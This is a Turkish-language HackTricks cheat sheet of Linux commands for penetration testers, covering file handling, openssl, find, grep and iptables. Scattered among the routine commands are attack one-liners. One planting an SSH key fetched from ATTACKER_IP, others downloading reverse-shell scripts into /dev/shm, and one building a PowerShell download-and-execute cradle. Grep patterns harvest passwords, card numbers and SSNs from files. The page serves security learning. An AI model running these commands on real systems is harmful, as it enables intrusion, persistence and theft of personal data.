# Faydalı Linux Komutları

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen iş akışlarını kolayca oluşturun ve otomatikleştirin.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>

## Ortak Bash Komutları
```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Windows için Bash
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0

#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```
## Greps

`grep` komutu, metin dosyalarında belirli bir deseni aramak için kullanılan güçlü bir arama aracıdır. Aşağıda, `grep` komutunun bazı yaygın kullanımlarını bulabilirsiniz:

- **Basit Arama**: `grep 'desen' dosya` komutu, belirli bir deseni içeren satırları bulmak için kullanılır. Örneğin, `grep 'hello' file.txt` komutu, `file.txt` dosyasında "hello" kelimesini içeren satırları bulur.

- **Bütün Kelime Araması**: `grep -w 'kelime' dosya` komutu, belirli bir kelimenin tam olarak eşleştiği satırları bulmak için kullanılır. Örneğin, `grep -w 'hello' file.txt` komutu, `file.txt` dosyasında sadece "hello" kelimesini içeren satırları bulur.

- **Büyük/Küçük Harf Duyarlılığı**: `grep -i 'desen' dosya` komutu, arama işlemini büyük/küçük harf duyarlılığı olmadan gerçekleştirir. Örneğin, `grep -i 'hello' file.txt` komutu, `file.txt` dosyasında "hello", "Hello" veya "HELLO" gibi farklı büyük/küçük harf kombinasyonlarını içeren satırları bulur.

- **Satır Numaralarını Gösterme**: `grep -n 'desen' dosya` komutu, eşleşen satırların yanında satır numaralarını da gösterir. Örneğin, `grep -n 'hello' file.txt` komutu, `file.txt` dosyasında "hello" kelimesini içeren satırları ve bu satırların numaralarını bulur.

- **Birden Fazla Dosyada Arama**: `grep 'desen' dosya1 dosya2` komutu, birden fazla dosyada aynı deseni aramak için kullanılır. Örneğin, `grep 'hello' file1.txt file2.txt` komutu, `file1.txt` ve `file2.txt` dosyalarında "hello" kelimesini içeren satırları bulur.

- **Dizinlerde Arama**: `grep -r 'desen' dizin` komutu, belirli bir deseni içeren tüm dosyaları ve alt dizinleri arar. Örneğin, `grep -r 'hello' /home/user` komutu, `/home/user` dizininde "hello" kelimesini içeren tüm dosyaları ve alt dizinlerini bulur.

Bu sadece `grep` komutunun bazı temel kullanımlarıdır. Daha fazla seçenek ve kullanım için `grep` komutunun man sayfasını (`man grep`) inceleyebilirsiniz.
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
## Bul

### Description
This command is used to search for files or directories in a specified location.

### Syntax
```
find [path] [options] [expression]
```

### Options
- `-name`: Searches for files or directories with a specific name.
- `-type`: Searches for files or directories of a specific type.
- `-size`: Searches for files of a specific size.
- `-user`: Searches for files or directories owned by a specific user.
- `-group`: Searches for files or directories owned by a specific group.
- `-mtime`: Searches for files or directories modified within a specific time frame.
- `-exec`: Executes a command on each file or directory found.

### Examples
1. Search for a file named "passwords.txt" in the current directory:
```
find . -name passwords.txt
```

2. Search for all directories in the "/var/www" directory:
```
find /var/www -type d
```

3. Search for files larger than 1MB in the "/home" directory:
```
find /home -type f -size +1M
```

4. Search for files modified within the last 7 days in the "/tmp" directory and delete them:
```
find /tmp -type f -mtime -7 -exec rm {} \;
```

### Additional Resources
- [Linux find command](https://linux.die.net/man/1/find)
```bash
# Find SUID set files.
find / -perm /u=s -ls 2>/dev/null

# Find SGID set files.
find / -perm /g=s -ls 2>/dev/null

# Found Readable directory and sort by time.  (depth = 4)
find / -type d -maxdepth 4 -readable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Writable directory and sort by time.  (depth = 10)
find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current User and sort by time. (depth = 10)
find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current Group ID and Sort by time. (depth = 10)
find / -maxdepth 10 -group $(id -g) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Newer files and sort by time. (depth = 5)
find / -maxdepth 5 -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer files only and sort by time. (depth = 5)
find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer directory only and sort by time. (depth = 5)
find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
```
## Nmap arama yardımı

Nmap, ağ tarama ve keşif aracıdır. Aşağıda, Nmap'in bazı yaygın kullanılan komutlarını ve parametrelerini bulabilirsiniz:

- `-sn`: Canlı cihazları tespit etmek için ICMP ping taraması yapar.
- `-sS`: TCP SYN taraması yapar.
- `-sU`: UDP taraması yapar.
- `-p`: Belirli bir port veya port aralığını taramak için kullanılır.
- `-O`: Hedef cihazın işletim sistemini tahmin etmek için kullanılır.
- `-A`: İşletim sistemi tahmini, port taraması, hizmet tespiti ve betik taraması gibi bir dizi tarama işlemi gerçekleştirir.
- `-v`: Ayrıntılı çıktı sağlar.
- `-oN`: Çıktıyı normal metin dosyasına kaydeder.
- `-oX`: Çıktıyı XML formatında kaydeder.

Nmap hakkında daha fazla bilgi için, Nmap'in resmi belgelerine başvurabilirsiniz.
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```
## Bash

Bash, kısaltması "Bourne Again Shell" olan bir Unix kabuk programıdır. Bash, Linux ve diğer Unix tabanlı işletim sistemlerinde yaygın olarak kullanılan bir kabuktur. Bash, kullanıcıların komutları çalıştırmasına, betikler yazmasına ve sistemle etkileşimde bulunmasına olanak tanır.

### Temel Komutlar

- `ls`: Mevcut dizindeki dosya ve dizinleri listeler.
- `cd`: Dizin değiştirir.
- `pwd`: Mevcut çalışma dizinini gösterir.
- `mkdir`: Yeni bir dizin oluşturur.
- `rm`: Dosya veya dizinleri siler.
- `cp`: Dosyaları veya dizinleri kopyalar.
- `mv`: Dosyaları veya dizinleri taşır veya yeniden adlandırır.
- `cat`: Dosyanın içeriğini görüntüler veya dosyaları birleştirir.
- `grep`: Belirli bir metni dosyalarda veya çıktılarda arar.
- `chmod`: Dosya veya dizinlerin izinlerini değiştirir.
- `chown`: Dosya veya dizinlerin sahiplerini değiştirir.
- `chgrp`: Dosya veya dizinlerin gruplarını değiştirir.
- `sudo`: Root (süper kullanıcı) olarak komutları çalıştırır.
- `su`: Kullanıcı hesabını değiştirir.

### Dosya İşlemleri

- `touch`: Yeni bir dosya oluşturur veya mevcut bir dosyanın zaman damgasını günceller.
- `cat`: Dosyanın içeriğini görüntüler veya dosyaları birleştirir.
- `head`: Dosyanın başlangıcını görüntüler.
- `tail`: Dosyanın sonunu görüntüler.
- `less`: Dosyanın içeriğini sayfa sayfa görüntüler.
- `wc`: Dosyanın satır, kelime ve karakter sayısını verir.
- `sort`: Dosyanın satırlarını sıralar.
- `uniq`: Dosyanın ardışık tekrarlanan satırlarını kaldırır.
- `cut`: Dosyanın belirli bir bölümünü keser.
- `paste`: Dosyaları birleştirir.
- `diff`: İki dosya arasındaki farkları gösterir.

### Ağ İşlemleri

- `ping`: Bir IP adresine veya alan adına ping atar.
- `ifconfig`: Ağ arayüzlerinin yapılandırmasını görüntüler veya değiştirir.
- `netstat`: Ağ bağlantılarını ve bağlantı noktalarını görüntüler.
- `ssh`: Uzak bir sunucuya güvenli bir şekilde bağlanır.
- `scp`: Dosyaları güvenli bir şekilde kopyalar.
- `wget`: İnternet üzerinden dosyaları indirir.
- `curl`: İnternet üzerindeki kaynaklara istek gönderir ve yanıtları alır.

### Süreç İşlemleri

- `ps`: Çalışan süreçleri listeler.
- `top`: Sistemdeki süreçleri gerçek zamanlı olarak izler.
- `kill`: Bir süreci sonlandırır.
- `bg`: Bir süreci arka planda çalıştırır.
- `fg`: Bir süreci ön plana alır.
- `nohup`: Bir süreci bağlantıyı kapatmadan arka planda çalıştırır.

### Diğer Kullanışlı Komutlar

- `history`: Komut geçmişini görüntüler.
- `alias`: Komutlara takma adlar verir.
- `man`: Bir komutun kullanımını ve belgelerini görüntüler.
- `which`: Bir komutun tam yolunu gösterir.
- `find`: Dosya ve dizinleri arar.
- `tar`: Dosyaları sıkıştırır veya açar.
- `gzip`: Dosyaları sıkıştırır veya açar.
- `sed`: Metin dönüşümleri yapar.
- `awk`: Metin işleme ve raporlama yapar.

Bu sadece birkaç temel Bash komutudur. Bash hakkında daha fazla bilgi edinmek için `man bash` komutunu kullanabilirsiniz.
```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```
## Iptables

Iptables, Linux işletim sistemlerinde kullanılan bir güvenlik duvarı aracıdır. İptables, paket filtreleme, ağ adresi çevirme ve ağ adresi ve port tabanlı paket yönlendirme gibi işlevleri gerçekleştirebilir. Aşağıda, Iptables'in temel kullanımı için bazı komutlar bulunmaktadır:

- `iptables -L`: Mevcut kuralları ve zincirleri listeler.
- `iptables -F`: Tüm kuralları ve zincirleri temizler.
- `iptables -A <chain> -p <protocol> --dport <port> -j <action>`: Belirli bir zincire yeni bir kural ekler. `<chain>` zincir adını, `<protocol>` protokol türünü, `<port>` hedef port numarasını ve `<action>` ise kuralın ne yapacağını belirtir.
- `iptables -D <chain> <rule_number>`: Belirli bir zincirden bir kuralı siler. `<chain>` zincir adını ve `<rule_number>` ise silinecek kuralın numarasını belirtir.
- `iptables -P <chain> <policy>`: Belirli bir zincirin varsayılan politikasını ayarlar. `<chain>` zincir adını ve `<policy>` ise varsayılan politikayı belirtir.

Daha fazla bilgi için, `man iptables` komutunu kullanabilirsiniz.
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```
<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** isterseniz, [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın **en gelişmiş topluluk araçları** tarafından desteklenen **iş akışlarını kolayca oluşturmak ve otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
